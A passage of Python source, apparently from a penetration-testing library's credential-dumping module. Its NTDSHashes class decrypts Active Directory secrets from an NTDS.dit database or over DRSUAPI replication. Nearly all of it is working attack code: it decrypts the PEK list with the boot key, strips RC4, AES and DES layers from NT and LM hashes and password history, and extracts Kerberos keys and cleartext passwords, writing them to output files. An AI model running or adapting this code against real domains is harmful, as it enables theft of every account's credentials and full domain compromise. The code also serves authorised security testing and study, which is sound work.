        except Exception as e:
            raise Exception('Cannot open resume session file name %s' % str(e))
        resumeSid = self.__resumeFile.read()
        self.__resumeFile.close()
        # Truncate and reopen the file as wb+
        self.__resumeFile = open(self.__resumeFileName,'wb+')
        return resumeSid.decode('utf-8')

    def getFileName(self):
        return self.__resumeFileName

    def beginTransaction(self):
        if not self.__resumeFileName:
            self.__resumeFileName = 'sessionresume_%s' % ''.join(random.choice(string.ascii_letters) for _ in range(8))
            LOG.debug('Session resume file will be %s' % self.__resumeFileName)
        if not self.__resumeFile:
            try:
                self.__resumeFile = open(self.__resumeFileName, 'wb+')
            except Exception as e:
                raise Exception('Cannot create "%s" resume session file: %s' % (self.__resumeFileName, str(e)))

    def endTransaction(self):
        if self.__resumeFile:
            self.__resumeFile.close()
            self.__resumeFile = None


class NTDSHashes:
    class SECRET_TYPE:
        NTDS = 0
        NTDS_CLEARTEXT = 1
        NTDS_KERBEROS = 2

    NAME_TO_INTERNAL = {
        'uSNCreated':b'ATTq131091',
        'uSNChanged':b'ATTq131192',
        'name':b'ATTm3',
        'objectGUID':b'ATTk589826',
        'objectSid':b'ATTr589970',
        'userAccountControl':b'ATTj589832',
        'primaryGroupID':b'ATTj589922',
        'accountExpires':b'ATTq589983',
        'logonCount':b'ATTj589993',
        'sAMAccountName':b'ATTm590045',
        'sAMAccountType':b'ATTj590126',
        'lastLogonTimestamp':b'ATTq589876',
        'userPrincipalName':b'ATTm590480',
        'unicodePwd':b'ATTk589914',
        'dBCSPwd':b'ATTk589879',
        'ntPwdHistory':b'ATTk589918',
        'lmPwdHistory':b'ATTk589984',
        'pekList':b'ATTk590689',
        'supplementalCredentials':b'ATTk589949',
        'pwdLastSet':b'ATTq589920',
    }

    NAME_TO_ATTRTYP = {
        'userPrincipalName': 0x90290,
        'sAMAccountName': 0x900DD,
        'unicodePwd': 0x9005A,
        'dBCSPwd': 0x90037,
        'ntPwdHistory': 0x9005E,
        'lmPwdHistory': 0x900A0,
        'supplementalCredentials': 0x9007D,
        'objectSid': 0x90092,
        'userAccountControl':0x90008,
    }

    ATTRTYP_TO_ATTID = {
        'userPrincipalName': '1.2.840.113556.1.4.656',
        'sAMAccountName': '1.2.840.113556.1.4.221',
        'unicodePwd': '1.2.840.113556.1.4.90',
        'dBCSPwd': '1.2.840.113556.1.4.55',
        'ntPwdHistory': '1.2.840.113556.1.4.94',
        'lmPwdHistory': '1.2.840.113556.1.4.160',
        'supplementalCredentials': '1.2.840.113556.1.4.125',
        'objectSid': '1.2.840.113556.1.4.146',
        'pwdLastSet': '1.2.840.113556.1.4.96',
        'userAccountControl':'1.2.840.113556.1.4.8',
    }

    KERBEROS_TYPE = {
        1:'dec-cbc-crc',
        3:'des-cbc-md5',
        17:'aes128-cts-hmac-sha1-96',
        18:'aes256-cts-hmac-sha1-96',
        0xffffff74:'rc4_hmac',
    }

    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.items())

    SAM_NORMAL_USER_ACCOUNT = 0x30000000
    SAM_MACHINE_ACCOUNT     = 0x30000001
    SAM_TRUST_ACCOUNT       = 0x30000002

    ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)

    class PEKLIST_ENC(Structure):
        structure = (
            ('Header','8s=b""'),
            ('KeyMaterial','16s=b""'),
            ('EncryptedPek',':'),
        )

    class PEKLIST_PLAIN(Structure):
        structure = (
            ('Header','32s=b""'),
            ('DecryptedPek',':'),
        )

    class PEK_KEY(Structure):
        structure = (
            ('Header','1s=b""'),
            ('Padding','3s=b""'),
            ('Key','16s=b""'),
        )

    class CRYPTED_HASH(Structure):
        structure = (
            ('Header','8s=b""'),
            ('KeyMaterial','16s=b""'),
            ('EncryptedHash','16s=b""'),
        )

    class CRYPTED_HASHW16(Structure):
        structure = (
            ('Header','8s=b""'),
            ('KeyMaterial','16s=b""'),
            ('Unknown','<L=0'),
            ('EncryptedHash', ':'),
        )

    class CRYPTED_HISTORY(Structure):
        structure = (
            ('Header','8s=b""'),
            ('KeyMaterial','16s=b""'),
            ('EncryptedHash',':'),
        )

    class CRYPTED_BLOB(Structure):
        structure = (
            ('Header','8s=b""'),
            ('KeyMaterial','16s=b""'),
            ('EncryptedHash',':'),
        )

    def __init__(self, ntdsFile, bootKey, isRemote=False, history=False, noLMHash=True, remoteOps=None,
                 useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None,
                 justUser=None, printUserStatus=False,
                 perSecretCallback = lambda secretType, secret : _print_helper(secret),
                 resumeSessionMgr=ResumeSessionMgrInFile):
        self.__bootKey = bootKey
        self.__NTDS = ntdsFile
        self.__history = history
        self.__noLMHash = noLMHash
        self.__useVSSMethod = useVSSMethod
        self.__remoteOps = remoteOps
        self.__pwdLastSet = pwdLastSet
        self.__printUserStatus = printUserStatus
        if self.__NTDS is not None:
            self.__ESEDB = ESENT_DB(ntdsFile, isRemote = isRemote)
            self.__cursor = self.__ESEDB.openTable('datatable')
        self.__tmpUsers = list()
        self.__PEK = list()
        self.__cryptoCommon = CryptoCommon()
        self.__kerberosKeys = OrderedDict()
        self.__clearTextPwds = OrderedDict()
        self.__justNTLM = justNTLM
        self.__resumeSession = resumeSessionMgr(resumeSession)
        self.__outputFileName = outputFileName
        self.__justUser = justUser
        self.__perSecretCallback = perSecretCallback

		# these are all the columns that we need to get the secrets.
		# If in the future someone finds other columns containing interesting things please extend ths table.
        self.__filter_tables_usersecret = {
            self.NAME_TO_INTERNAL['objectSid'] : 1,
            self.NAME_TO_INTERNAL['dBCSPwd'] : 1,
            self.NAME_TO_INTERNAL['name'] : 1,
            self.NAME_TO_INTERNAL['sAMAccountType'] : 1,
            self.NAME_TO_INTERNAL['unicodePwd'] : 1,
            self.NAME_TO_INTERNAL['sAMAccountName'] : 1,
            self.NAME_TO_INTERNAL['userPrincipalName'] : 1,
            self.NAME_TO_INTERNAL['ntPwdHistory'] : 1,
            self.NAME_TO_INTERNAL['lmPwdHistory'] : 1,
            self.NAME_TO_INTERNAL['pwdLastSet'] : 1,
            self.NAME_TO_INTERNAL['userAccountControl'] : 1,
            self.NAME_TO_INTERNAL['supplementalCredentials'] : 1,
            self.NAME_TO_INTERNAL['pekList'] : 1,

        }

    def getResumeSessionFile(self):
        return self.__resumeSession.getFileName()

    def __getPek(self):
        LOG.info('Searching for pekList, be patient')
        peklist = None
        while True:
            try:
                record = self.__ESEDB.getNextRow(self.__cursor, filter_tables=self.__filter_tables_usersecret)
            except:
                LOG.error('Error while calling getNextRow(), trying the next one')
                continue

            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                peklist =  unhexlify(record[self.NAME_TO_INTERNAL['pekList']])
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                # Okey.. we found some users, but we're not yet ready to process them.
                # Let's just store them in a temp list
                self.__tmpUsers.append(record)

        if peklist is not None:
            encryptedPekList = self.PEKLIST_ENC(peklist)
            if encryptedPekList['Header'][:4] == b'\x02\x00\x00\x00':
                # Up to Windows 2012 R2 looks like header starts this way
                md5 = hashlib.new('md5')
                md5.update(self.__bootKey)
                for i in range(1000):
                    md5.update(encryptedPekList['KeyMaterial'])
                tmpKey = md5.digest()
                rc4 = ARC4.new(tmpKey)
                decryptedPekList = self.PEKLIST_PLAIN(rc4.encrypt(encryptedPekList['EncryptedPek']))
                PEKLen = len(self.PEK_KEY())
                for i in range(len( decryptedPekList['DecryptedPek'] ) // PEKLen ):
                    cursor = i * PEKLen
                    pek = self.PEK_KEY(decryptedPekList['DecryptedPek'][cursor:cursor+PEKLen])
                    LOG.info("PEK # %d found and decrypted: %s", i, hexlify(pek['Key']).decode('utf-8'))
                    self.__PEK.append(pek['Key'])

            elif encryptedPekList['Header'][:4] == b'\x03\x00\x00\x00':
                # Windows 2016 TP4 header starts this way
                # Encrypted PEK Key seems to be different, but actually similar to decrypting LSA Secrets.
                # using AES:
                # Key: the bootKey
                # CipherText: PEKLIST_ENC['EncryptedPek']
                # IV: PEKLIST_ENC['KeyMaterial']
                decryptedPekList = self.PEKLIST_PLAIN(
                    self.__cryptoCommon.decryptAES(self.__bootKey, encryptedPekList['EncryptedPek'],
                                                   encryptedPekList['KeyMaterial']))

                # PEK list entries take the form:
                #   index (4 byte LE int), PEK (16 byte key)
                # the entries are in ascending order, and the list is terminated
                # by an entry with a non-sequential index (08080808 observed)
                pos, cur_index = 0, 0
                while True:
                    pek_entry = decryptedPekList['DecryptedPek'][pos:pos+20]
                    if len(pek_entry) < 20: break # if list truncated, should not happen
                    index, pek = unpack('<L16s', pek_entry)
                    if index != cur_index: break # break on non-sequential index
                    self.__PEK.append(pek)
                    LOG.info("PEK # %d found and decrypted: %s", index, hexlify(pek).decode('utf-8'))
                    cur_index += 1
                    pos += 20

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        # PEK index can be found on header of each ciphered blob (pos 8-10)
        pekIndex = hexlify(cryptedHash['Header'])
        md5.update(self.__PEK[int(pekIndex[8:10])])
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])

        return decryptedHash

    @staticmethod
    def __fileTimeToDateTime(t):
        t -= 116444736000000000
        t //= 10000000
        if t < 0:
            return 'never'
        else:
            dt = datetime.fromtimestamp(t)
            return dt.strftime("%Y-%m-%d %H:%M")

    def __decryptSupplementalInfo(self, record, prefixTable=None, keysFile=None, clearTextFile=None):
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        haveInfo = False
        LOG.debug('Entering NTDSHashes.__decryptSupplementalInfo')
        if self.__useVSSMethod is True:
            if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
                if len(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']])) > 24:
                    if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                        domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                        userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
                    else:
                        userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
                    cipherText = self.CRYPTED_BLOB(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']]))

                    if cipherText['Header'][:4] == b'\x13\x00\x00\x00':
                        # Win2016 TP4 decryption is different
                        pekIndex = hexlify(cipherText['Header'])
                        plainText = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])],
                                                                   cipherText['EncryptedHash'][4:],
                                                                   cipherText['KeyMaterial'])
                        haveInfo = True
                    else:
                        plainText = self.__removeRC4Layer(cipherText)
                        haveInfo = True
        else:
            domain = None
            userName = None
            replyVersion = 'V%d' % record['pdwOutVersion']
            for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
                try:
                    attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                    LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
                except Exception as e:
                    LOG.debug('Failed to execute OidFromAttid with error %s' % e)
                    LOG.debug('Exception', exc_info=True)
                    # Fallbacking to fixed table and hope for the best
                    attId = attr['attrTyp']
                    LOOKUP_TABLE = self.NAME_TO_ATTRTYP

                if attId == LOOKUP_TABLE['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                        except:
                            domain = None
                    else:
                        domain = None
                elif attId == LOOKUP_TABLE['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            LOG.error(
                                'Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                            userName = 'unknown'
                    else:
                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        userName = 'unknown'
                if attId == LOOKUP_TABLE['supplementalCredentials']:
                    if attr['AttrVal']['valCount'] > 0:
                        blob = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        plainText = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), blob)
                        if len(plainText) > 24:
                            haveInfo = True
            if domain is not None:
                userName = '%s\\%s' % (domain, userName)

        if haveInfo is True:
            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                # On some old w2k3 there might be user properties that don't
                # match [MS-SAMR] structure, discarding them
                return
            propertiesData = userProperties['UserProperties']
            for propertyCount in range(userProperties['PropertyCount']):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                # For now, we will only process Newer Kerberos Keys and CLEARTEXT
                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                    propertyValueBuffer = unhexlify(userProperty['PropertyValue'])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew['Buffer']
                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]

                        if  keyDataNew['KeyType'] in self.KERBEROS_TYPE:
                            answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],hexlify(keyValue).decode('utf-8'))
                        else:
                            answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),hexlify(keyValue).decode('utf-8'))
                        # We're just storing the keys, not printing them, to make the output more readable
                        # This is kind of ugly... but it's what I came up with tonight to get an ordered
                        # set :P. Better ideas welcomed ;)
                        self.__kerberosKeys[answer] = None
                        if keysFile is not None:
                            self.__writeOutput(keysFile, answer + '\n')
                elif userProperty['PropertyName'].decode('utf-16le') == 'Primary:CLEARTEXT':
                    # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
                    # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
                    try:
                        answer = "%s:CLEARTEXT:%s" % (userName, unhexlify(userProperty['PropertyValue']).decode('utf-16le'))
                    except UnicodeDecodeError:
                        # This could be because we're decoding a machine password. Printing it hex
                        answer = "%s:CLEARTEXT:0x%s" % (userName, userProperty['PropertyValue'].decode('utf-8'))

                    self.__clearTextPwds[answer] = None
                    if clearTextFile is not None:
                        self.__writeOutput(clearTextFile, answer + '\n')

            if clearTextFile is not None:
                clearTextFile.flush()
            if keysFile is not None:
                keysFile.flush()

        LOG.debug('Leaving NTDSHashes.__decryptSupplementalInfo')

    def __decryptHash(self, record, prefixTable=None, outputFile=None):
        LOG.debug('Entering NTDSHashes.__decryptHash')
        if self.__useVSSMethod is True:
            LOG.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])

            sid = SAMR_RPC_SID(unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]))
            rid = sid.formatCanonical().split('-')[-1]

            if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
                encryptedLMHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['dBCSPwd']]))
                if encryptedLMHash['Header'][:4] == b'\x13\x00\x00\x00':
                    # Win2016 TP4 decryption is different
                    encryptedLMHash = self.CRYPTED_HASHW16(unhexlify(record[self.NAME_TO_INTERNAL['dBCSPwd']]))
                    pekIndex = hexlify(encryptedLMHash['Header'])
                    tmpLMHash = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])],
                                                               encryptedLMHash['EncryptedHash'][:16],
                                                               encryptedLMHash['KeyMaterial'])
                else:
                    tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
                LMHash = self.__removeDESLayer(tmpLMHash, rid)
            else:
                LMHash = ntlm.LMOWFv1('', '')

            if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
                encryptedNTHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
                if encryptedNTHash['Header'][:4] == b'\x13\x00\x00\x00':
                    # Win2016 TP4 decryption is different
                    encryptedNTHash = self.CRYPTED_HASHW16(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
                    pekIndex = hexlify(encryptedNTHash['Header'])
                    tmpNTHash = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])],
                                                               encryptedNTHash['EncryptedHash'][:16],
                                                               encryptedNTHash['KeyMaterial'])
                else:
                    tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
                NTHash = self.__removeDESLayer(tmpNTHash, rid)
            else:
                NTHash = ntlm.NTOWFv1('', '')

            if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
            else:
                userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]

            if self.__printUserStatus is True:
                # Enabled / disabled users
                if record[self.NAME_TO_INTERNAL['userAccountControl']] is not None:
                    if '{0:08b}'.format(record[self.NAME_TO_INTERNAL['userAccountControl']])[-2:-1] == '1':
                        userAccountStatus = 'Disabled'
                    elif '{0:08b}'.format(record[self.NAME_TO_INTERNAL['userAccountControl']])[-2:-1] == '0':
                        userAccountStatus = 'Enabled'
                else:
                    userAccountStatus = 'N/A'

            if record[self.NAME_TO_INTERNAL['pwdLastSet']] is not None:
                pwdLastSet = self.__fileTimeToDateTime(record[self.NAME_TO_INTERNAL['pwdLastSet']])
            else:
                pwdLastSet = 'N/A'

            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash).decode('utf-8'), hexlify(NTHash).decode('utf-8'))
            if self.__pwdLastSet is True:
                answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
            if self.__printUserStatus is True:
                answer = "%s (status=%s)" % (answer, userAccountStatus)

            self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)

            if outputFile is not None:
                self.__writeOutput(outputFile, answer + '\n')

            if self.__history:
                LMHistory = []
                NTHistory = []
                if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                    encryptedLMHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['lmPwdHistory']]))
                    tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
                    for i in range(0, len(tmpLMHistory) // 16):
                        LMHash = self.__removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                        LMHistory.append(LMHash)

                if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                    encryptedNTHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))

                    if encryptedNTHistory['Header'][:4] == b'\x13\x00\x00\x00':
                        # Win2016 TP4 decryption is different
                        encryptedNTHistory = self.CRYPTED_HASHW16(
                            unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))
                        pekIndex = hexlify(encryptedNTHistory['Header'])
                        tmpNTHistory = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])],
                                                                      encryptedNTHistory['EncryptedHash'],
                                                                      encryptedNTHistory['KeyMaterial'])
                    else:
                        tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)

                    for i in range(0, len(tmpNTHistory) // 16):
                        NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                        NTHistory.append(NTHash)

                for i, (LMHash, NTHash) in enumerate(
                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHash)

                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash.decode('utf-8'),
                                                           hexlify(NTHash).decode('utf-8'))
                    if outputFile is not None:
                        self.__writeOutput(outputFile, answer + '\n')
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
        else:
            replyVersion = 'V%d' %record['pdwOutVersion']
            LOG.debug('Decrypting hash for user: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
            domain = None
            if self.__history:
                LMHistory = []
                NTHistory = []

            rid = unpack('<L', record['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]

            for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
                try:
                    attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                    LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
                except Exception as e:
                    LOG.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                    LOG.debug('Exception', exc_info=True)
                    # Fallbacking to fixed table and hope for the best
                    attId = attr['attrTyp']
                    LOOKUP_TABLE = self.NAME_TO_ATTRTYP

                if attId == LOOKUP_TABLE['dBCSPwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encrypteddBCSPwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedLMHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encrypteddBCSPwd)
                        LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                    else:
                        LMHash = ntlm.LMOWFv1('', '')
                elif attId == LOOKUP_TABLE['unicodePwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedNTHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedUnicodePwd)
                        NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                    else:
                        NTHash = ntlm.NTOWFv1('', '')
                elif attId == LOOKUP_TABLE['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                        except:
                            domain = None
                    else:
                        domain = None
                elif attId == LOOKUP_TABLE['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                            userName = 'unknown'
                    else:
                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        userName = 'unknown'
                elif attId == LOOKUP_TABLE['objectSid']:
                    if attr['AttrVal']['valCount'] > 0:
                        objectSid = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    else:
                        LOG.error('Cannot get objectSid for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        objectSid = rid
                elif attId == LOOKUP_TABLE['pwdLastSet']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            pwdLastSet = self.__fileTimeToDateTime(unpack('<Q', b''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0])
                        except:
                            LOG.error('Cannot get pwdLastSet for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                            pwdLastSet = 'N/A'
                elif self.__printUserStatus and attId == LOOKUP_TABLE['userAccountControl']:
                    if attr['AttrVal']['valCount'] > 0:
                        if (unpack('<L', b''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0]) & samr.UF_ACCOUNTDISABLE:
                            userAccountStatus = 'Disabled'
                        else:
                            userAccountStatus = 'Enabled'
                    else:
                        userAccountStatus = 'N/A'

                if self.__history:
                    if attId == LOOKUP_TABLE['lmPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedLMHistory = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpLMHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedLMHistory)
                            for i in range(0, len(tmpLMHistory) // 16):
                                LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                                LMHistory.append(LMHashHistory)
                        else:
                            LOG.debug('No lmPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    elif attId == LOOKUP_TABLE['ntPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedNTHistory = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpNTHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedNTHistory)
                            for i in range(0, len(tmpNTHistory) // 16):
                                NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                                NTHistory.append(NTHashHistory)
                        else:
                            LOG.debug('No ntPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])

            if domain is not None:
                userName = '%s\\%s' % (domain, userName)

            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash).decode('utf-8'), hexlify(NTHash).decode('utf-8'))
            if self.__pwdLastSet is True:
                answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
            if self.__printUserStatus is True:
                answer = "%s (status=%s)" % (answer, userAccountStatus)
            self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)

            if outputFile is not None:
                self.__writeOutput(outputFile, answer + '\n')

            if self.__history:
                for i, (LMHashHistory, NTHashHistory) in enumerate(
                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHashHistory)

                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash.decode('utf-8'),
                                                           hexlify(NTHashHistory).decode('utf-8'))
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
                    if outputFile is not None:
                        self.__writeOutput(outputFile, answer + '\n')

        if outputFile is not None:
            outputFile.flush()

        LOG.debug('Leaving NTDSHashes.__decryptHash')

    def dump(self):
        hashesOutputFile = None
        keysOutputFile = None
        clearTextOutputFile = None

        if self.__useVSSMethod is True:
            if self.__NTDS is None:
                # No NTDS.dit file provided and were asked to use VSS
                return
        else:
            if self.__NTDS is None:
                # DRSUAPI method, checking whether target is a DC
                try:
                    if self.__remoteOps is not None:
                        try:
                            self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
                        except:
                            if os.getenv('KRB5CCNAME') is not None and self.__justUser is not None:
                                # RemoteOperations failed. That might be because there was no way to log into the
                                # target system. We just have a last resort. Hope we have tickets cached and that they
                                # will work
                                pass
                            else:
                                raise
                    else:
                        raise Exception('No remote Operations available')
                except Exception as e:
                    LOG.debug('Exiting NTDSHashes.dump() because %s' % e)
                    # Target's not a DC
                    return

        try:
            # Let's check if we need to save results in a file
            if self.__outputFileName is not None:
                LOG.debug('Saving output to %s' % self.__outputFileName)
                # We have to export. Are we resuming a session?
                if self.__resumeSession.hasResumeData():
                    mode = 'a+'
                else:
                    mode = 'w+'
                hashesOutputFile = openFile(self.__outputFileName+'.ntds',mode)
                if self.__justNTLM is False:
                    keysOutputFile = openFile(self.__outputFileName+'.ntds.kerberos',mode)
                    clearTextOutputFile = openFile(self.__outputFileName+'.ntds.cleartext',mode)

            LOG.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
            if self.__useVSSMethod:
                # We start getting rows from the table aiming at reaching
                # the pekList. If we find users records we stored them
                # in a temp list for later process.
                self.__getPek()
                if self.__PEK is not None:
                    LOG.info('Reading and decrypting hashes from %s ' % self.__NTDS)
                    # First of all, if we have users already cached, let's decrypt their hashes
                    for record in self.__tmpUsers:
                        try:
                            self.__decryptHash(record, outputFile=hashesOutputFile)
                            if self.__justNTLM is False:
                                self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
                        except Exception as e:
                            LOG.debug('Exception', exc_info=True)
                            try:
                                LOG.error(
                                    "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                                LOG.error(str(e))
                                pass
                            except:
                                LOG.error("Error while processing row!")
                                LOG.error(str(e))
                                pass

                    # Now let's keep moving through the NTDS file and decrypting what we find
                    while True:
                        try:
                            record = self.__ESEDB.getNextRow(self.__cursor, filter_tables=self.__filter_tables_usersecret)
                        except:
                            LOG.error('Error while calling getNextRow(), trying the next one')
                            continue

                        if record is None:
                            break
                        try:
                            if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                                self.__decryptHash(record, outputFile=hashesOutputFile)
                                if self.__justNTLM is False:
                                    self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
                        except Exception as e:
                            LOG.debug('Exception', exc_info=True)
                            try:
                                LOG.error(
                                    "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                                LOG.error(str(e))
                                pass
                            except:
                                LOG.error("Error while processing row!")
                                LOG.error(str(e))
                                pass
            else:
                LOG.info('Using the DRSUAPI method to get NTDS.DIT secrets')
                status = STATUS_MORE_ENTRIES
                enumerationContext = 0

